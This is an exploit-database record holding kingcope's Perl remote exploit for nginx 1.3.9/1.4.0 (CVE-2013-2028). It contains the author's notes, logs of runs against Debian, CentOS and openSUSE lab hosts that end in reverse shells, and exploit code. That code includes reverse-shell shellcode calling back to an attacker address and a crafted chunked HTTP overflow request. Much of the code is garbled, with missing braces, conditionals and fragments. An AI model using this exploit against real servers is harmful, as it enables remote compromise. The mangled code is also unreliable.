{
    "text": "vul_name : nginx 1.3.9 / 1.4.0 x86 Brute Force Proof Of Concept ， vul_cve : CVE-2013-2028 ， vul_poc :  # nginx 1.3.9/1.4.0 x86 brute force remote exploit ，  # copyright ( c ) 2013 kingcope ，  # fix for internet exploitation , set MTU :  ，  # ifconfig <interface> mtu 60000 up ，  #  ! WARNING !  ，  # this exploit is unlikely to succeed when used against remote internet hosts. ，  # the reason is that nginx uses a non-blocking read (  ) at the remote connection ,  ，  # this makes exploitation of targets on the internet highly unreliable. ，  #  ( it has been tested against a testbed on the internet but I couldn't exploit ，  # any other box with it. required was the above ifconfig setting on the client. ，  # maybe enabling large tcp frame support on a gigabit connection is more ，  # useful )  ，  # so use it inside intranets only ( duh !  )  , this remains a PoC for now : D ，  # The exploit does not break stack cookies but makes use of a reliable method ，  # to retrieve all needed offsets for Linux x86 and pop a shell. ，  # TODO ，  #  * cleanup code ，  #  * implement stack cookie break and amd64 support ，  #  * support proxy_pass directive ， =for comment ， TARGET TESTS ( Debian , Centos , OpenSuSE )  ， 1. Debian 7 ， perl ngxunlock.pl 192.168.27.146 80 192.168.27.146 443 ， Testing if remote httpd is vulnerable % SEGV % ， YES % ， Finding align distance ( estimate )  ， testing 5250 align % SEGV % ， testing 5182 align % SEGV % ， Verifying align ， Finding align distance ( estimate )  ， testing 5250 align % SEGV % ， testing 5182 align % SEGV % ， Finding write offset , determining exact align ， testing 0x08049c50 , 5184 align % SURVIVED % ， Extracting memory \\ ， bin search done , read 20480 bytes ， exact align found 5184 ， Finding exact library addresses ， trying plt 0x08049a32 , got 0x080bc1a4 , function 0xb76f4a80 % FOUND exact ioctl 0x08049a30 % ， trying plt 0x08049ce2 , got 0x080bc250 , function 0xb773e890 % FOUND exact memset 0x08049ce0 % ， trying plt 0x08049d52 , got 0x080bc26c , function 0xb76f8d40 % FOUND exact mmap64 0x08049d50 % ， Found library offsets , determining mnemonics ， trying 0x0804ed2d % SURVIVED % ， exact large pop ret 0x0804a7eb ， exact pop x3 ret 0x0804a7ee ， bin search done |  ， See reverse handler for success ， nc -v -l -p 443 ， listening on [ any ] 443 . ， 192.168.27.146 : inverse host lookup failed : Unknown host ， connect to [ 192.168.27.146 ] from ( UNKNOWN )  [ 192.168.27.146 ] 34778 ， uname -a ; id ;  ， Linux dakkong 3.2.0-4-686-pae # 1 SMP Debian 3.2.46-1 i686 GNU/Linux ， uid=65534 ( nobody ) gid=65534 ( nogroup ) groups=65534 ( nogroup )  ， cat /etc/debian_version ， 7.1 ， 2. CentOS 6.4 ， perl ngxunlock.pl 192.168.27.129 80 192.168.27.129 443 ， Testing if remote httpd is vulnerable % SEGV % ， YES % ， Finding align distance ( estimate )  ， testing 5250 align % SEGV % ， testing 5194 align % SEGV % ， Verifying align ， Finding align distance ( estimate )  ， testing 5250 align % SEGV % ， testing 5194 align % SEGV % ， Finding write offset , determining exact align ， testing 0x08049990 , 5200 align % SURVIVED % ， Extracting memory / ， bin search done , read 20480 bytes ， exact align found 5200 ， Finding exact library addresses ， trying plt 0x080499f2 , got 0x080b31ac , function 0x0094a6b0 % FOUND exact memset 0x080499f0 % ， trying plt 0x08049b52 , got 0x080b3204 , function 0x008f1fd0 % FOUND exact ioctl 0x08049b50 % ， trying plt 0x08049f12 , got 0x080b32f4 , function 0x008f72c0 % FOUND exact mmap64 0x08049f10 % ， Found library offsets , determining mnemonics ， trying 0x0804e9d4 % SURVIVED % ， exact large pop ret 0x0806194d ， exact pop x3 ret 0x0804a832 ， bin search done / ， See reverse handler for success ， nc -v -l 443 ， Connection from 192.168.27.129 port 443 [ tcp/https ] accepted ， uname -a ; id ;  ， Linux localhost.localdomain 2.6.32-358.el6.i686 # 1 SMP Thu Feb 21 21 : 50 : 49 UTC 2013 i686 i686 i386 GNU/Linux ， uid=99 ( nobody ) gid=99 ( nobody ) groups=99 ( nobody ) context=unconfined_u : unconfined_r : unconfined_t : s0-s0 : c0.c1023 ， cat /etc/redhat *  ， CentOS release 6.4 ( Final )  ， 3. OpenSuSE 12.1 ， perl ngxunlock.pl 192.168.27.135 80 192.168.27.135 443 ， Testing if remote httpd is vulnerable % SEGV % ， YES % ， Finding align distance ( estimate )  ， testing 5250 align % SEGV % ， testing 5182 align % SEGV % ， Verifying align ， Finding align distance ( estimate )  ， testing 5250 align % SEGV % ， testing 5182 align % SEGV % ， Finding write offset , determining exact align ， testing 0x08049a18 , 5184 align % SURVIVED % ， Extracting memory \\ ， bin search done , read 20480 bytes ， exact align found 5184 ， Finding exact library addresses ， trying plt 0x08049a6a , got 0x080be08c , function 0xb75f74f0 % FOUND exact memset 0x08049a68 % ， trying plt 0x08049b8a , got 0x080be0d4 , function 0xb764b160 % FOUND exact ioctl 0x08049b88 % ， trying plt 0x08049eea , got 0x080be1ac , function 0xb76501e0 % FOUND exact mmap64 0x08049ee8 % ， Found library offsets , determining mnemonics ， trying 0x0804ea7f % SURVIVED % ， exact large pop ret 0x0804a7fa ， exact pop x3 ret 0x0804a101 ， bin search done - ， See reverse handler for success ， Connection from 192.168.27.135 port 443 [ tcp/https ] accepted ， uname -a ; id ;  ， Linux linux-01xg 3.1.0-1.2-desktop # 1 SMP PREEMPT Thu Nov 3 14 : 45 : 45 UTC 2011 ( 187dde0 ) i686 i686 i386 GNU/Linux ， uid=65534 ( nobody ) gid=65533 ( nobody ) groups=65533 ( nobody )  , 65534 ( nogroup )  ， cat /etc/SuSE- *  ， openSUSE ， VERSION = 12.1 ， openSUSE 12.1 ( i586 )  ， VERSION = 12.1 ， CODENAME = Asparagus ， =cut ， use IO : Socket ;  ， print \"nginx remote exploit\\n\" ;  ， print \"copyright ( c ) 2013 kingcope\\n\" ;  ， print \"usage :  $ 0 <target> <target port> <reverse ip> <reverse port>\\n\" ;  ， exit ;  ， } ，  $ target = $ ARGV [ 0 ]  ;  ，  $ targetport = $ ARGV [ 1 ]  ;  ，  $ cbip = $ ARGV [ 2 ]  ;  ，  $ cbport = $ ARGV [ 3 ]  ;  ，  # linux reverse shell by bighawk ，  $ lnxcbsc = ， \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x46\\xcd\\x80\\x90\\x90\\x90\\x6a\\x66\\x58\\x6a\\x01\\x5b\" ， .\"\\x31\\xc9\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x68\" ， .\"\\x7f\\x7f\\x7f\\x7f\" # IP ， .\"\\x66\\x68\" . \"\\xb0\\xef\" # PORT ， .\"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\x89\\xc6\\x6a\\x03\\x5b\\x6a\\x66\" ， .\"\\x58\\xcd\\x80\\x87\\xf3\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x31\\xd2\" ， .\"\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80\" ;  ，  (  $ a1 ,  $ a2 ,  $ a3 ,  $ a4 ) = split ( / , gethostbyname ( \" $ cbip\" )  ;  ， substr (  $ lnxcbsc , 31 , 4 ,  $ a1 . $ a2 . $ a3 . $ a4 )  ;  ，  (  $ p1 ,  $ p2 ) = split ( / , reverse ( pack ( \"s\" ,  $ cbport )  ;  ，  $ p1 = chr ( ord (  $ p1 )  ;  ，  $ p2 = chr ( ord (  $ p2 )  ;  ， substr (  $ lnxcbsc , 37 , 2 ,  $ p1 . $ p2 )  ;  ，  $  | =1 ;  ，  $ uri=\" ;  ， test target vulnerable ，  #  $ k = 0x80498d0 ;  ，  #  $ align2 = 5200 ;  ，  #  $ alignplus=0 ;  ，  # goto debug ;  ， print \"Testing if remote httpd is vulnerable \" ;  ，  $ uritested = 0 ;  ， test :  ， goto l ;  ， connecterr :  ， print \"\\nDestination host unreachable\\n\" ;  ， exit ;  ， } ， goto again ;  ， l :  ， again :  ，  $ sock = IO : Socket : INET->new ( PeerAddr => $ target ,  ， PeerPort => $ targetport ,  ， Proto => 'tcp' )  | {goto connecterr} ;  ， setsockopt (  $ sock , SOL_SOCKET , SO_SNDBUF , 60000 )  ;  ，  $ req = \"HEAD / $ uri HTTP/1.1\\r\\nHost :  $ target\\r\\n\" ， .\"Connection : close\\r\\n\" ， .\"Transfer-Encoding : chunked\\r\\n\\r\\n\" ;  ，  $ req .= \"0\" x ( 1024-length (  $ req ) -16 ) . \"8000000000003770\" ;  ，  $ stack = pack ( \"V\" , 0xc0debabe )  ;  ， twinkle (  )  ;  ， print $ sock $ req ;  ， send (  $ sock , \"A\" x ( 5555-1024 ) . $ stack , MSG_OOB )  ;  ，  $ l = read (  $ sock ,  $ buffer , 0x10 )  ;  ， close (  $ sock )  ;  ， twinkle (  )  ;  ， next ;  ， } ， print \"% SEGV %\\n\" ;  ， print \"YES %\\n\" ;  ， goto yes ;  ， } ， } ，  $ uri = \"50x.html\" ;  ，  $ uritested=1 ;  ， goto test ;  ， } ， print \"\\n\\ NO %\\n\" ;  ， print \"\\ Try to increase client MTU with ifconfig <interface> mtu 60000 up\\n\\n\\ Debug output\\n\" ;  ，  $ sock = IO : Socket : INET->new ( PeerAddr => $ target ,  ， PeerPort => $ targetport ,  ， Proto => 'tcp' )  | {goto connecterr} ;  ， setsockopt (  $ sock , SOL_SOCKET , SO_SNDBUF , 60000 )  ;  ，  $ req = \"GET / HTTP/1.1\\r\\nHost :  $ target\\r\\n\" ， .\"Connection : keep-alive\\r\\n\" ， .\"Transfer-Encoding : chunked\\r\\n\\r\\n\" ;  ，  $ req .= \"0\" x ( 1024-length (  $ req ) -16 ) . \"8000000000003770\" ;  ，  $ stack = pack ( \"V\" , 0xc0debabe )  ;  ， print $ sock $ req ;  ， send (  $ sock , \"A\" x ( 5555-1024 ) . $ stack , MSG_OOB )  ;  ，  $ line = 0 ;  ， print ;  ， last ;  ， } ， } ， exit ;  ， find align ，  $ verifyalign = 0 ;  ， yes :  ， print \"Finding align distance ( estimate ) \\n\" ;  ， printf ( \"testing %d align \" ,  $ align )  ;  ， again0_1 :  ，  #  $ sock = IO : Socket : INET->new ( PeerAddr => $ target ,  ，  # PeerPort => $ targetport ,  ，  # Proto => 'tcp' )  | {goto again0_1} ;  ，  # setsockopt (  $ sock , SOL_SOCKET , SO_SNDBUF , 60000 )  ;  ，  #  $ req = \"HEAD / $ uri HTTP/1.1\\r\\nHost :  $ target\\r\\n\" ，  # .\"Connection : close\\r\\n\\r\\n\" ; ",
    "time": "2013-07-11 / 2013-07-25"
}